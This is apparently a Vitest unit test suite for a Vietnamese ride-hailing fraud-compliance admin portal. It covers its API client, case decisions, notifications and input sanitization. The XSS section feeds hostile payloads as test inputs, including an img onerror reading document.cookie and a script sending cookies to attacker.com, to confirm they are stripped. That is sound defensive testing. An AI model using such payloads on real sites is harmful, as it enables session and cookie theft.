/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 * 
 * GSM Admin Portal - API & Compliance Unit Test Suite
 */

import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import {
  fetchApi,
  complianceApi,
  operatorApi,
  notificationApi,
  ticketApi,
  metricsApi,
  sanitizeInput,
  isValidCccd,
  API_BASE_URL,
} from '../services/api';
import {
  FraudCase,
  ComplianceMetrics,
  DriverComplianceInfo,
  OperatorProfile,
  AppNotification,
} from '../types';

describe('GSM Admin App - API Client Test Suite', () => {
  const originalFetch = globalThis.fetch;

  const mockResponse = (data: unknown, status = 200, statusText = 'OK'): Response => {
    return {
      ok: status >= 200 && status < 300,
      status,
      statusText,
      json: async () => data,
    } as unknown as Response;
  };

  const mockErrorResponse = (
    status: number,
    statusText: string,
    data?: unknown,
    jsonThrows = false
  ): Response => {
    return {
      ok: false,
      status,
      statusText,
      json: async () => {
        if (jsonThrows) throw new Error('Invalid JSON');
        return data ?? {};
      },
    } as unknown as Response;
  };

  beforeEach(() => {
    vi.clearAllMocks();
  });

  afterEach(() => {
    globalThis.fetch = originalFetch;
    vi.useRealTimers();
  });

  // =========================================================================
  // 1. fetchApi Core Functionality
  // =========================================================================
  describe('fetchApi()', () => {
    it('should successfully fetch data and return parsed JSON', async () => {
      const mockData = { id: 1, name: 'GSM Test' };
      globalThis.fetch = vi.fn().mockResolvedValue(mockResponse(mockData));

      const result = await fetchApi<{ id: number; name: string }>('/test');
      expect(result).toEqual(mockData);
      expect(globalThis.fetch).toHaveBeenCalledTimes(1);

      const [calledUrl, calledInit] = (globalThis.fetch as any).mock.calls[0];
      expect(calledUrl).toBe(`${API_BASE_URL}/test`);
      expect(calledInit.headers).toMatchObject({
        'Content-Type': 'application/json',
        Accept: 'application/json',
      });
    });

    it('should properly format endpoint without leading slash', async () => {
      globalThis.fetch = vi.fn().mockResolvedValue(mockResponse({ success: true }));

      await fetchApi('test-endpoint');
      const [calledUrl] = (globalThis.fetch as any).mock.calls[0];
      expect(calledUrl).toBe(`${API_BASE_URL}/test-endpoint`);
    });

    it('should set Content-Type and Accept headers and merge custom headers', async () => {
      globalThis.fetch = vi.fn().mockResolvedValue(mockResponse({}));

      await fetchApi('/headers-check', {
        headers: {
          'X-Custom-Header': 'GSM-Admin-Test',
          Authorization: 'Bearer gsm_token_123',
        },
      });

      const [, calledInit] = (globalThis.fetch as any).mock.calls[0];
      expect(calledInit.headers).toEqual({
        'Content-Type': 'application/json',
        Accept: 'application/json',
        'X-Custom-Header': 'GSM-Admin-Test',
        Authorization: 'Bearer gsm_token_123',
      });
    });

    describe('HTTP Error Handling', () => {
      it('should handle HTTP 400 Bad Request with custom error message from server', async () => {
        globalThis.fetch = vi.fn().mockResolvedValue(
          mockErrorResponse(400, 'Bad Request', {
            message: 'Dữ liệu đầu vào không hợp lệ hoặc thiếu trường bắt buộc',
          })
        );

        await expect(fetchApi('/bad-request')).rejects.toThrow(
          'Dữ liệu đầu vào không hợp lệ hoặc thiếu trường bắt buộc'
        );
      });

      it('should handle HTTP 400 Bad Request fallback when message is missing', async () => {
        globalThis.fetch = vi.fn().mockResolvedValue(
          mockErrorResponse(400, 'Bad Request', {})
        );

        await expect(fetchApi('/bad-request')).rejects.toThrow('Lỗi API (400): Bad Request');
      });

      it('should handle HTTP 404 Not Found error', async () => {
        globalThis.fetch = vi.fn().mockResolvedValue(
          mockErrorResponse(404, 'Not Found', null, true)
        );

        await expect(fetchApi('/cases/not-found')).rejects.toThrow('Lỗi API (404): Not Found');
      });

      it('should handle HTTP 500 Internal Server Error', async () => {
        globalThis.fetch = vi.fn().mockResolvedValue(
          mockErrorResponse(500, 'Internal Server Error', {
            message: 'Lỗi cơ sở dữ liệu nội bộ',
          })
        );

        await expect(fetchApi('/server-error')).rejects.toThrow('Lỗi cơ sở dữ liệu nội bộ');
      });

      it('should handle HTTP 500 fallback status message', async () => {
        globalThis.fetch = vi.fn().mockResolvedValue(
          mockErrorResponse(500, 'Internal Server Error', {})
        );

        await expect(fetchApi('/server-error')).rejects.toThrow(
          'Lỗi API (500): Internal Server Error'
        );
      });
    });

    describe('Timeout & Abort Handling', () => {
      it('should abort and throw timeout error when server exceeds default timeout (8000ms)', async () => {
        vi.useFakeTimers();

        globalThis.fetch = vi.fn().mockImplementation((_url, options) => {
          return new Promise((_, reject) => {
            if (options?.signal) {
              options.signal.addEventListener('abort', () => {
                const abortError = new Error('The operation was aborted');
                abortError.name = 'AbortError';
                reject(abortError);
              });
            }
          });
        });

        const fetchPromise = fetchApi('/slow-endpoint');
        vi.advanceTimersByTime(8001);

        await expect(fetchPromise).rejects.toThrow(
          'Quá thời gian chờ phản hồi từ máy chủ (8000ms)'
        );
      });

      it('should abort and throw timeout error with custom timeoutMs', async () => {
        vi.useFakeTimers();

        globalThis.fetch = vi.fn().mockImplementation((_url, options) => {
          return new Promise((_, reject) => {
            if (options?.signal) {
              options.signal.addEventListener('abort', () => {
                const abortError = new Error('The operation was aborted');
                abortError.name = 'AbortError';
                reject(abortError);
              });
            }
          });
        });

        const fetchPromise = fetchApi('/quick-endpoint', { timeoutMs: 3000 });
        vi.advanceTimersByTime(3001);

        await expect(fetchPromise).rejects.toThrow(
          'Quá thời gian chờ phản hồi từ máy chủ (3000ms)'
        );
      });
    });

    describe('Non-HTTP / Unknown Errors', () => {
      it('should rethrow standard network Error instances', async () => {
        globalThis.fetch = vi.fn().mockRejectedValue(new Error('Network disconnected'));

        await expect(fetchApi('/offline')).rejects.toThrow('Network disconnected');
      });

      it('should handle non-Error thrown objects gracefully', async () => {
        globalThis.fetch = vi.fn().mockRejectedValue('Unknown string rejection');

        await expect(fetchApi('/unknown-failure')).rejects.toThrow(
          'Lỗi không xác định khi gọi API'
        );
      });
    });
  });

  // =========================================================================
  // 2. complianceApi Functionality
  // =========================================================================
  describe('complianceApi', () => {
    describe('getCases()', () => {
      it('should call /compliance/cases without query parameters when no filters provided', async () => {
        globalThis.fetch = vi.fn().mockResolvedValue(mockResponse([]));

        const res = await complianceApi.getCases();
        expect(res).toEqual([]);
        const [calledUrl] = (globalThis.fetch as any).mock.calls[0];
        expect(calledUrl).toBe(`${API_BASE_URL}/compliance/cases`);
      });

      it('should properly build query parameters for status, fraudType, severity, and search', async () => {
        globalThis.fetch = vi.fn().mockResolvedValue(mockResponse([{ id: '#GL-8842' }]));

        await complianceApi.getCases({
          status: 'da_nop_cho_duyet',
          fraudType: 'cuoc_ao',
          severity: 'nghiem_trong',
          search: 'TX-0921',
        });

        const [calledUrl] = (globalThis.fetch as any).mock.calls[0];
        expect(calledUrl).toContain('/compliance/cases?');
        expect(calledUrl).toContain('status=da_nop_cho_duyet');
        expect(calledUrl).toContain('fraudType=cuoc_ao');
        expect(calledUrl).toContain('severity=nghiem_trong');
        expect(calledUrl).toContain('search=TX-0921');
      });

      it('should filter out "all" values from query string', async () => {
        globalThis.fetch = vi.fn().mockResolvedValue(mockResponse([]));

        await complianceApi.getCases({
          status: 'all',
          fraudType: 'all',
          severity: 'all',
          search: '',
        });

        const [calledUrl] = (globalThis.fetch as any).mock.calls[0];
        expect(calledUrl).toBe(`${API_BASE_URL}/compliance/cases`);
      });

      it('should trim whitespace from search query', async () => {
        globalThis.fetch = vi.fn().mockResolvedValue(mockResponse([]));

        await complianceApi.getCases({
          search: '  001099012345  ',
        });

        const [calledUrl] = (globalThis.fetch as any).mock.calls[0];
        expect(calledUrl).toBe(`${API_BASE_URL}/compliance/cases?search=001099012345`);
      });
    });

    describe('getCaseById()', () => {
      it('should safely encode special characters and hash symbols in case ID', async () => {
        const mockCase: Partial<FraudCase> = { id: '#GL-8842' };
        globalThis.fetch = vi.fn().mockResolvedValue(mockResponse(mockCase));

        const result = await complianceApi.getCaseById('#GL-8842');
        expect(result.id).toBe('#GL-8842');

        const [calledUrl] = (globalThis.fetch as any).mock.calls[0];
        expect(calledUrl).toBe(`${API_BASE_URL}/compliance/cases/%23GL-8842`);
      });

      it('should safely encode path characters and spaces in case ID', async () => {
        globalThis.fetch = vi.fn().mockResolvedValue(mockResponse({ id: 'GL/2026 01' }));

        await complianceApi.getCaseById('GL/2026 01');

        const [calledUrl] = (globalThis.fetch as any).mock.calls[0];
        expect(calledUrl).toBe(`${API_BASE_URL}/compliance/cases/GL%2F2026%2001`);
      });
    });

    describe('submitDecision()', () => {
      it('should post payload conforming to DecisionRequestDto structure', async () => {
        const mockCaseResponse: Partial<FraudCase> = {
          id: '#GL-8842',
          status: 'da_tha_loi',
        };

        globalThis.fetch = vi.fn().mockResolvedValue(mockResponse(mockCaseResponse));

        const decisionPayload = {
          decisionType: 'tha_loi' as const,
          reason: 'Dữ liệu GPS phù hợp với hành trình thực tế sau khi đối soát Telematics',
          messageToDriver: 'Hồ sơ của bạn đã được minh oan. Tài khoản hoạt động bình thường.',
          officerName: 'Nguyễn Mai Chi',
          officerCode: 'GSM-INSPECT-88',
          fineAmount: 0,
          suspensionDays: 0,
        };

        const result = await complianceApi.submitDecision('#GL-8842', decisionPayload);
        expect(result).toEqual(mockCaseResponse);

        const [calledUrl, calledInit] = (globalThis.fetch as any).mock.calls[0];
        expect(calledUrl).toBe(`${API_BASE_URL}/compliance/cases/%23GL-8842/decision`);
        expect(calledInit.method).toBe('POST');

        const parsedBody = JSON.parse(calledInit.body);
        expect(parsedBody).toEqual({
          decisionType: 'tha_loi',
          reason: 'Dữ liệu GPS phù hợp với hành trình thực tế sau khi đối soát Telematics',
          messageToDriver: 'Hồ sơ của bạn đã được minh oan. Tài khoản hoạt động bình thường.',
          officerName: 'Nguyễn Mai Chi',
          officerCode: 'GSM-INSPECT-88',
          fineAmount: 0,
          suspensionDays: 0,
        });
      });

      it('should support penalty decision with fineAmount and suspensionDays', async () => {
        globalThis.fetch = vi.fn().mockResolvedValue(
          mockResponse({ id: '#GL-9999', status: 'da_xu_phat' })
        );

        await complianceApi.submitDecision('GL-9999', {
          decisionType: 'tam_khoa',
          reason: 'Vi phạm điều 5 quy chế chống cuốc ảo',
          messageToDriver: 'Tài khoản của bạn bị tạm khóa 7 ngày.',
          fineAmount: 500000,
          suspensionDays: 7,
          officerName: 'Trần Văn Nam',
          officerCode: 'GSM-INSPECT-02',
        });

        const [, calledInit] = (globalThis.fetch as any).mock.calls[0];
        const body = JSON.parse(calledInit.body);
        expect(body.decisionType).toBe('tam_khoa');
        expect(body.fineAmount).toBe(500000);
        expect(body.suspensionDays).toBe(7);
      });
    });

    describe('requestMoreEvidence()', () => {
      it('should send POST request with { note } payload', async () => {
        globalThis.fetch = vi.fn().mockResolvedValue(
          mockResponse({ id: '#GL-8842', status: 'yeu_cau_bo_sung' })
        );

        const result = await complianceApi.requestMoreEvidence(
          '#GL-8842',
          'Vui lòng cung cấp ảnh chụp lịch sử cuốc xe và biên nhận sạc pin'
        );

        expect(result.status).toBe('yeu_cau_bo_sung');
        const [calledUrl, calledInit] = (globalThis.fetch as any).mock.calls[0];
        expect(calledUrl).toBe(`${API_BASE_URL}/compliance/cases/%23GL-8842/request-evidence`);
        expect(calledInit.method).toBe('POST');

        const body = JSON.parse(calledInit.body);
        expect(body).toEqual({
          note: 'Vui lòng cung cấp ảnh chụp lịch sử cuốc xe và biên nhận sạc pin',
        });
      });
    });

    describe('getMetrics()', () => {
      it('should fetch SLA metrics and case statistics correctly', async () => {
        const mockMetrics: ComplianceMetrics = {
          totalCases: 148,
          pendingReview: 12,
          exoneratedCount: 95,
          penalizedCount: 41,
          totalFinesRecovered: 82500000,
          avgReviewTimeHours: 3.4,
          slaCompliancePercent: 98.5,
        };

        globalThis.fetch = vi.fn().mockResolvedValue(mockResponse(mockMetrics));

        const result = await complianceApi.getMetrics();
        expect(result).toEqual(mockMetrics);
        expect(result.slaCompliancePercent).toBe(98.5);
        expect(result.totalCases).toBe(148);
        expect(result.pendingReview).toBe(12);

        const [calledUrl] = (globalThis.fetch as any).mock.calls[0];
        expect(calledUrl).toBe(`${API_BASE_URL}/compliance/metrics`);
      });
    });

    describe('getDriverByCccd()', () => {
      it('should query driver by 12-digit CCCD with proper URI encoding and trimming', async () => {
        const mockDriver: DriverComplianceInfo = {
          id: 'TX-0921',
          name: 'Lê Hoàng Anh',
          cccd: '001099012345',
          phone: '0901234567',
          plate: '29E-123.45',
          vehicleModel: 'VinFast VF e34',
          trustScore: 92,
          priorViolationsCount: 1,
          completedRides: 1420,
          rating: 4.95,
        };

        globalThis.fetch = vi.fn().mockResolvedValue(mockResponse(mockDriver));

        const result = await complianceApi.getDriverByCccd('  001099012345  ');
        expect(result).toEqual(mockDriver);
        expect(result.cccd).toBe('001099012345');

        const [calledUrl] = (globalThis.fetch as any).mock.calls[0];
        expect(calledUrl).toBe(`${API_BASE_URL}/compliance/drivers/001099012345`);
      });
    });

    describe('getAllDrivers()', () => {
      it('should fetch driver directory with and without search parameter', async () => {
        globalThis.fetch = vi.fn().mockResolvedValue(mockResponse([]));

        await complianceApi.getAllDrivers();
        expect((globalThis.fetch as any).mock.calls[0][0]).toBe(`${API_BASE_URL}/compliance/drivers`);

        await complianceApi.getAllDrivers('29E-123.45');
        expect((globalThis.fetch as any).mock.calls[1][0]).toBe(
          `${API_BASE_URL}/compliance/drivers?search=29E-123.45`
        );
      });
    });
  });

  // =========================================================================
  // 3. operatorApi & notificationApi Functionality
  // =========================================================================
  describe('operatorApi & notificationApi', () => {
    describe('operatorApi', () => {
      it('getProfile() should fetch operator profile', async () => {
        const mockProfile: OperatorProfile = {
          id: 'op-001',
          name: 'Nguyễn Mai Chi',
          code: 'GSM-INSPECT-88',
          role: 'Kiểm soát viên Tuân thủ & Gian lận GSM',
          shift: 'Ca sáng',
          shiftTime: '07:00 - 15:00',
          avatarUrl: '/avatar-chi.svg',
          status: 'online',
        };

        globalThis.fetch = vi.fn().mockResolvedValue(mockResponse(mockProfile));

        const result = await operatorApi.getProfile();
        expect(result).toEqual(mockProfile);

        const [calledUrl] = (globalThis.fetch as any).mock.calls[0];
        expect(calledUrl).toBe(`${API_BASE_URL}/operator/profile`);
      });

      it('updateStatus() should send PATCH request with updated status', async () => {
        const updatedProfile: OperatorProfile = {
          id: 'op-001',
          name: 'Nguyễn Mai Chi',
          code: 'GSM-INSPECT-88',
          role: 'Kiểm soát viên Tuân thủ & Gian lận GSM',
          shift: 'Ca sáng',
          shiftTime: '07:00 - 15:00',
          avatarUrl: '/avatar-chi.svg',
          status: 'break',
        };

        globalThis.fetch = vi.fn().mockResolvedValue(mockResponse(updatedProfile));

        const result = await operatorApi.updateStatus('break');
        expect(result.status).toBe('break');

        const [calledUrl, calledInit] = (globalThis.fetch as any).mock.calls[0];
        expect(calledUrl).toBe(`${API_BASE_URL}/operator/status`);
        expect(calledInit.method).toBe('PATCH');
        expect(JSON.parse(calledInit.body)).toEqual({ status: 'break' });
      });
    });

    describe('notificationApi', () => {
      it('getNotifications() should fetch alert list', async () => {
        const mockNotifications: AppNotification[] = [
          {
            id: 'notif-1',
            title: 'Cảnh báo cuốc ảo mới',
            desc: 'Phát hiện nghi vấn GPS giả lập tại khu vực Hà Nội',
            time: '1 phút trước',
            type: 'danger',
            read: false,
          },
        ];

        globalThis.fetch = vi.fn().mockResolvedValue(mockResponse(mockNotifications));

        const result = await notificationApi.getNotifications();
        expect(result).toEqual(mockNotifications);

        const [calledUrl] = (globalThis.fetch as any).mock.calls[0];
        expect(calledUrl).toBe(`${API_BASE_URL}/notifications`);
      });

      it('markAsRead() should post to /notifications/:id/read with URI encoding', async () => {
        globalThis.fetch = vi.fn().mockResolvedValue(mockResponse({ success: true }));

        await notificationApi.markAsRead('notif-123');

        const [calledUrl, calledInit] = (globalThis.fetch as any).mock.calls[0];
        expect(calledUrl).toBe(`${API_BASE_URL}/notifications/notif-123/read`);
        expect(calledInit.method).toBe('POST');
      });

      it('markAsRead() should work with numeric id', async () => {
        globalThis.fetch = vi.fn().mockResolvedValue(mockResponse({ success: true }));

        await notificationApi.markAsRead(456);

        const [calledUrl] = (globalThis.fetch as any).mock.calls[0];
        expect(calledUrl).toBe(`${API_BASE_URL}/notifications/456/read`);
      });
    });
  });

  // =========================================================================
  // 4. Compatibility Aliases (ticketApi & metricsApi)
  // =========================================================================
  describe('ticketApi & metricsApi aliases', () => {
    it('ticketApi.closeTicket() should trigger tha_loi decision with standard note', async () => {
      globalThis.fetch = vi.fn().mockResolvedValue(mockResponse({ id: 'GL-100' }));

      await ticketApi.closeTicket('GL-100');

      const [calledUrl, calledInit] = (globalThis.fetch as any).mock.calls[0];
      expect(calledUrl).toBe(`${API_BASE_URL}/compliance/cases/GL-100/decision`);
      const body = JSON.parse(calledInit.body);
      expect(body.decisionType).toBe('tha_loi');
      expect(body.reason).toBe('Hoàn tất thẩm định');
    });

    it('metricsApi.getShiftMetrics() should delegate to complianceApi.getMetrics', async () => {
      globalThis.fetch = vi.fn().mockResolvedValue(mockResponse({ totalCases: 50 }));

      const res = await metricsApi.getShiftMetrics();
      expect(res.totalCases).toBe(50);
      const [calledUrl] = (globalThis.fetch as any).mock.calls[0];
      expect(calledUrl).toBe(`${API_BASE_URL}/compliance/metrics`);
    });
  });

  // =========================================================================
  // 5. Data Sanitization & XSS Defense & Junk Handling
  // =========================================================================
  describe('Data Sanitization & XSS Defense', () => {
    describe('sanitizeInput() utility', () => {
      it('should strip <script> tags and inner code', () => {
        const malicious = "<script>alert('XSS Attack');</script>Giải trình cuốc xe bình thường";
        expect(sanitizeInput(malicious)).toBe('Giải trình cuốc xe bình thường');
      });

      it('should strip complex / nested HTML tags, images with onerror, and iframe', () => {
        const xssPayload =
          '<img src=x onerror="alert(document.cookie)" /><b>Hồ sơ</b><iframe src="evil.com"></iframe>';
        expect(sanitizeInput(xssPayload)).toBe('Hồ sơ');
      });

      it('should remove javascript: pseudo-protocol strings', () => {
        const jsLink = '<a href="javascript:stealToken()">Xem tài liệu</a>';
        expect(sanitizeInput(jsLink)).toBe('Xem tài liệu');
      });

      it('should trim junk whitespace, newlines, and tabs', () => {
        const messy = '   \n\t  Bằng chứng hợp lệ   \t\n ';
        expect(sanitizeInput(messy)).toBe('Bằng chứng hợp lệ');
      });

      it('should handle junk data types (null, undefined, numbers, objects) safely', () => {
        expect(sanitizeInput(null)).toBe('');
        expect(sanitizeInput(undefined)).toBe('');
        expect(sanitizeInput(12345)).toBe('');
        expect(sanitizeInput({})).toBe('');
        expect(sanitizeInput(['malicious'])).toBe('');
      });
    });

    describe('Sanitization in API calls', () => {
      it('submitDecision() should sanitize reason, messageToDriver, officerName, officerCode', async () => {
        globalThis.fetch = vi.fn().mockResolvedValue(mockResponse({ id: 'GL-1' }));

        await complianceApi.submitDecision('GL-1', {
          decisionType: 'canh_cao',
          reason: '  <script>evil()</script>Nhắc nhở vi phạm quy chế  ',
          messageToDriver: '<img src=x onerror=alert(1)>Vui lòng chú ý không tắt định vị',
          officerName: '<b>Chi NM</b>',
          officerCode: '<script>alert(1)</script>GSM-INSPECT-88',
        });

        const [, calledInit] = (globalThis.fetch as any).mock.calls[0];
        const body = JSON.parse(calledInit.body);

        expect(body.reason).toBe('Nhắc nhở vi phạm quy chế');
        expect(body.messageToDriver).toBe('Vui lòng chú ý không tắt định vị');
        expect(body.officerName).toBe('Chi NM');
        expect(body.officerCode).toBe('GSM-INSPECT-88');
      });

      it('requestMoreEvidence() should sanitize note payload against XSS and junk input', async () => {
        globalThis.fetch = vi.fn().mockResolvedValue(mockResponse({ id: 'GL-1' }));

        await complianceApi.requestMoreEvidence(
          'GL-1',
          '  <script type="text/javascript">fetch("http://attacker.com?c=" + document.cookie);</script>Cần bổ sung sao kê ngân hàng  '
        );

        const [, calledInit] = (globalThis.fetch as any).mock.calls[0];
        const body = JSON.parse(calledInit.body);
        expect(body.note).toBe('Cần bổ sung sao kê ngân hàng');
      });
    });

    describe('CCCD 12-digit Format Validation', () => {
      it('should validate exactly 12-digit Vietnamese CCCD strings', () => {
        expect(isValidCccd('001099012345')).toBe(true);
        expect(isValidCccd('  001099012345  ')).toBe(true);
      });

      it('should reject invalid CCCD (letters, symbols, wrong length)', () => {
        expect(isValidCccd('00109901234')).toBe(false); // 11 digits
        expect(isValidCccd('0010990123456')).toBe(false); // 13 digits
        expect(isValidCccd('00109901234A')).toBe(false); // contains letter
        expect(isValidCccd('')).toBe(false);
        expect(isValidCccd('TX-0921')).toBe(false);
      });
    });
  });
});
